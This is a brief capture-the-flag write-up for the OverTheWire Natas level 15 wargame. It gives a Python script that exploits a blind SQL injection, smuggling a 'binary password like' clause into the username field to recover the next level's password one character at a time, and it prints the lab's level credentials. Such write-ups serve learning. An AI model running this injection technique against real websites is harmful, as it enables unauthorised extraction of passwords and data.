It have been more complicated than the previous ones, but here I am with the solution.
In order to exploit this form I need to exploit the LIKE command of SQL queries.
In that sense I wrote a python script that takes each posible letter character and start triying one by one.
Python code here:
import requests
from string import *

characters = ascii_lowercase + ascii_uppercase + digits
base_username = "natas15"
base_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = "http://natas15.natas.labs.overthewire.org/"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

while len(password) < 32:
    for char in characters:
        response = requests.post(url,
                                 data={"username": 'natas16" AND binary password like "' + password + char + '%%" # '},
                                 auth=(base_username, base_password))
        content = response.text
        if 'This user exists' in content:
            password += char
            print(password)
            break
At the end I obtained the key.
